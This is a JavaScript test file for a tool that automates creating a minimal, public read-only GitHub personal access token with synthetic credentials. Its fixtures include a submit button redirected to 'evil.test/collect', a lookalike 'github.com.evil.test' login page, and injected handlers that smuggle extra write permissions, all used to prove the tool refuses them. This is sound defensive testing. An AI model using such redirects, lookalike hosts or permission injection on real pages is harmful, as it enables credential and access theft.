import test from 'node:test';
import assert from 'node:assert/strict';
import { chromium } from '../server/browser-runtime.js';
const { PatBrowser, PatSession } = await import('../server/pat-browser.js').catch(() => ({}));

const token = 'github_pat_SYNTHETIC_fixture_123456789';
const form = (patch = '') => `<meta name="user-login" content="octo"><form method="post" action="/settings/personal-access-tokens">
<label>Resource owner<select name="target_name"><option selected>octo</option></select></label>
<label>Expiration<select name="expires_in"><option value="30" selected>30 days</option></select></label>
<fieldset><legend>Repository access</legend><label><input type="radio" name="repository_access" value="public" checked>Public repositories (read-only)</label></fieldset>
<fieldset><legend>Account permissions</legend><p>No account permissions</p></fieldset>
<fieldset><legend>Repository permissions</legend><p>No repository permissions</p></fieldset>
${patch}<button type="submit">Generate token</button></form>`;
async function fixture(t, html, url = 'https://github.com/settings/personal-access-tokens/new', callbacks = {}) {
  assert.equal(typeof PatSession, 'function');
  const browser = await chromium.launch({ headless: true, executablePath: chromium.executablePath() });
  const context = await browser.newContext();
  t.after(async () => { await context.close(); await browser.close(); });
  let submissions = 0;
  await context.route('**/*', route => {
    const posted = route.request().method() === 'POST';
    if (posted) submissions++;
    return route.fulfill({ contentType: 'text/html', body: callbacks.native && posted ? `<input id="new-access-token" value="${token}">` : html });
  });
  const page = await context.newPage();
  await page.goto(url);
  await page.exposeFunction('submittedFixture', () => ++submissions);
  if (!callbacks.native) await page.evaluate(value => {
    document.querySelector('form')?.addEventListener('submit', event => {
      event.preventDefault(); window.submittedFixture();
      document.body.innerHTML = `<input id="new-access-token" value="${value}">`;
    });
  }, token);
  const session = new PatSession(context, { account: { username: 'octo' }, getSecrets: () => ({ password: 'synthetic', otp: { code: '123456', expiresAt: Date.now() + 30000 } }), name: 'fixture', onSubmitted() {}, onToken() {}, ...callbacks });
  return { session, page, context, submissions: () => submissions };
}

test('PAT creation persists before a single submit and immediately captures only once', async t => {
  let persisted = false, persistedBeforeSubmit = false;
  const captured = [];
  const f = await fixture(t, form(), undefined, {
    native: true,
    onSubmitted: () => { persisted = true; },
    onToken: (value, expiry) => { persistedBeforeSubmit = persisted; captured.push(value); assert.ok(Date.parse(expiry) > Date.now() + 29 * 86400000); },
  });
  assert.equal((await f.session.step()).status, 'captured');
  assert.equal((await f.session.step()).status, 'captured');
  assert.equal(f.submissions(), 1);
  assert.deepEqual(captured, [token]);
  assert.equal(persistedBeforeSubmit, true);
  assert.ok(!JSON.stringify(await f.session.step()).includes(token));
});

test('PAT form arriving after navigation is awaited before deciding the layout is unknown', async t => {
  const html='<p>Loading</p><script>setTimeout(()=>{document.body.innerHTML='+JSON.stringify(form())+'},350)</script>';
  const f=await fixture(t,html,undefined,{native:true});
  assert.equal((await f.session.step()).status,'captured');
  assert.equal(f.submissions(),1);
});

for (const [name, html] of [
  ['wrong identity', form().replace('content="octo"', 'content="other"')],
  ['wrong owner', form().replace('<option selected>octo', '<option selected>other')],
  ['extra permission', form('<select name="permissions[contents]"><option value="read" selected>Read</option></select>')],
  ['missing positive permission proof', form().replace('No account permissions', 'Permissions')],
  ['missing public proof', form().replace('value="public" checked', 'value="all" checked')],
  ['wrong expiry', form().replace('value="30"', 'value="90"')],
  ['unrecognized submitted permission', form('<select name="contents"><option selected>read</option></select>')],
  ['external form-associated permission', form().replace('<form ', '<form id="generation" ') + '<input form="generation" name="permission[admin]" value="write">'],
  ['overridden submit destination', form().replace('type="submit">Generate', 'type="submit" formaction="https://evil.test/collect">Generate')],
]) test(`PAT ${name} requires manual review without creation`, async t => {
  const f = await fixture(t, html);
  const result = await f.session.step();
  assert.equal(result.status, 'manual');
  assert.equal(f.submissions(), 0);
  assert.ok(result.reason);
});

test('stopping during persisted submission marker cannot generate a PAT', async t => {
  let f;
  f = await fixture(t, form(), undefined, { onSubmitted: async () => { await f.session.close(); } });
  assert.equal((await f.session.step()).status, 'manual');
  assert.equal(f.submissions(), 0);
});

test('official login fills only its bound main document form', async t => {
  const f = await fixture(t, '<form method="post" action="/session"><input id="login_field"><input id="password" type="password"><button type="submit">Sign in</button></form>', 'https://github.com/login');
  await f.page.evaluate(() => document.querySelector('form').addEventListener('submit', event => { event.preventDefault(); event.stopImmediatePropagation(); }, true));
  await f.session.step();
  assert.equal(await f.page.locator('#login_field').inputValue(), 'octo');
  assert.equal(await f.page.locator('#password').inputValue(), 'synthetic');
});

test('human generation POST cannot bypass durable marker and validated submission', async t => {
  const f = await fixture(t, form().replace('No account permissions', 'Unknown permissions'));
  let upstreamPosts = 0;
  // Registered before the session guard via fallback in the fixture's existing route.
  // Re-assigning outerHTML is intentional: it forces the browser to re-parse the
  // form so the test can prove the listener survives a DOM replacement.
  // eslint-disable-next-line no-self-assign
  await f.page.evaluate(() => { const form = document.querySelector('form'); form.outerHTML = form.outerHTML; });
  f.context.on('response', response => { if (response.request().method() === 'POST') upstreamPosts++; });
  const failed = f.page.waitForEvent('requestfailed', { predicate: request => request.method() === 'POST', timeout: 3000 });
  await f.page.evaluate(() => document.querySelector('form').submit());
  await failed;
  assert.equal(upstreamPosts, 0);
  assert.equal((await f.session.step()).status, 'manual');
});

test('native creation POST is allowed once after persisted validation and its result is captured', async t => {
  let persisted = false, saved = false;
  const f = await fixture(t, form(), undefined, { native: true, onSubmitted: () => { persisted = true; }, onToken: value => { assert.equal(value, token); saved = true; } });
  f.context.on('request', request => { if (request.method() === 'POST') assert.equal(persisted, true); });
  assert.equal((await f.session.step()).status, 'captured');
  assert.equal(saved, true);
  await f.session.step();
  assert.equal(f.submissions(), 1);
});

test('post-validation submit handler cannot inject extra permissions into the actual request', async t => {
  const f = await fixture(t, form(), undefined, { native: true });
  await f.page.evaluate(() => document.querySelector('form').addEventListener('submit', event => {
    const input = document.createElement('input'); input.name = 'permissions[contents]'; input.value = 'write'; event.target.append(input);
  }));
  assert.equal((await f.session.step()).status, 'manual');
  assert.equal(f.submissions(), 0);
});

test('formdata listener cannot smuggle grants into the validated request snapshot', async t => {
  const f = await fixture(t, form(), undefined, { native: true });
  await f.page.evaluate(() => document.querySelector('form').addEventListener('formdata', event => {
    event.formData.append('permissions[contents]', 'write');
  }));
  assert.equal((await f.session.step()).status, 'manual');
  assert.equal(f.submissions(), 0);
});

test('navigation during durable submission marker never acts in a replacement document', async t => {
  let f;
  f = await fixture(t, form(), undefined, { onSubmitted: async () => { await f.page.goto(f.page.url()); } });
  assert.equal((await f.session.step()).status, 'manual');
  assert.equal(f.submissions(), 0);
});

test('untrusted and email challenges never read credentials', async t => {
  for (const url of ['https://github.com.evil.test/login', 'https://github.com/sessions/verified-device']) {
    let reads = 0;
    const f = await fixture(t, '<form action="/session"><input id="login_field"><input id="password" type="password"><button>Sign in</button></form>', url, { getSecrets: () => { reads++; return { password: 'secret' }; } });
    assert.equal((await f.session.step()).status, 'manual');
    assert.equal(reads, 0);
  }
});

test('official app challenge obtains a fresh TOTP at fill time', async t => {
  let reads = 0;
  const f = await fixture(t, '<form method="post" action="/sessions/two-factor"><input id="app_totp"><button type="submit">Verify</button></form>', 'https://github.com/sessions/two-factor/app', {
    getSecrets: () => ({ otp: { code: String(++reads).padStart(6, '1'), expiresAt: Date.now() + 30000 } }),
  });
  await f.page.evaluate(() => document.querySelector('form').addEventListener('submit', event => { event.preventDefault(); event.stopImmediatePropagation(); }, true));
  const result = await f.session.step();
  // The fixture swallows the submit, so the challenge never advances: the session
  // refills with a fresh code once (rejected-code retry) and then pauses with an
  // explicit reason instead of leaving a possibly stale code on the page.
  assert.equal(result.status, 'manual');
  assert.equal(result.reason, 'totp_rejected');
  assert.ok(reads >= 2, 'a fresh code is generated at fill time');
});

test('PAT launch uses only project executable and an isolated context without a profile', async () => {
  assert.equal(typeof PatBrowser, 'function');
  let launch, contextOptions, requested;
  const page = { goto: async url => { requested = url; } };
  const context = { on() {}, route: async () => {}, newPage: async () => page, close: async () => {} };
  const engine = { executablePath: () => process.execPath, launch: async options => { launch = options; return { newContext: async options => { contextOptions = options; return context; }, close: async () => {} }; } };
  const browser = new PatBrowser({ chromium: engine });
  const session = await browser.open({ account: { username: 'octo' }, name: 'Public reads', getSecrets() {}, onSubmitted() {}, onToken() {} });
  assert.equal(launch.executablePath, process.execPath);
  assert.equal(launch.channel, undefined);
  assert.equal(launch.userDataDir, undefined);
  assert.equal(contextOptions.storageState, undefined);
  const url = new URL(requested);
  assert.equal(url.origin + url.pathname, 'https://github.com/settings/personal-access-tokens/new');
  assert.equal(url.searchParams.get('expires_in'), '30');
  assert.deepEqual([...url.searchParams.keys()].sort(), ['description', 'expires_in', 'name']);
  await session.close();
});

test('cancel while initial navigation is opening closes the isolated browser immediately', async () => {
  let finishNavigation, opened, contextClosed = false, browserClosed = false;
  const navigating = new Promise(resolve => { opened = resolve; });
  const page = { goto: () => { opened(); return new Promise(resolve => { finishNavigation = resolve; }); } };
  const context = { on() {}, route: async () => {}, newPage: async () => page, close: async () => { contextClosed = true; finishNavigation(); } };
  const engine = { executablePath: () => process.execPath, launch: async () => ({ newContext: async () => context, close: async () => { browserClosed = true; } }) };
  const browser = new PatBrowser({ chromium: engine });
  const controller = new AbortController();
  const opening = browser.open({ account: { username: 'octo' }, name: 'fixture', signal: controller.signal });
  await navigating;
  controller.abort();
  await new Promise(resolve => setImmediate(resolve));
  assert.equal(contextClosed, true);
  assert.equal(browserClosed, true);
  const session = await opening;
  await session.close();
});

test('identity rejection after durable marker revokes native generation permission', async t => {
  let f;
  f = await fixture(t, form(), undefined, { native: true, onSubmitted: async () => {
    await f.page.evaluate(() => { document.querySelector('meta[name="user-login"]').content = 'other'; });
  } });
  assert.equal((await f.session.step()).reason, 'identity');
  const failure = f.page.waitForEvent('requestfailed', { predicate: request => request.method() === 'POST', timeout: 1500 });
  await f.page.evaluate(() => document.querySelector('form').submit());
  await failure;
  assert.equal(f.submissions(), 0);
});

test('replacement document cannot consume a delayed unused generation capability', async t => {
  const f = await fixture(t, form(), undefined, { native: true });
  await f.page.evaluate(() => document.querySelector('form').addEventListener('submit', event => event.preventDefault()));
  assert.equal((await f.session.step()).status, 'manual');
  await f.page.goto(f.page.url());
  const failure = f.page.waitForEvent('requestfailed', { predicate: request => request.method() === 'POST', timeout: 1500 });
  await f.page.evaluate(() => document.querySelector('form').submit());
  await failure;
  assert.equal(f.submissions(), 0);
});
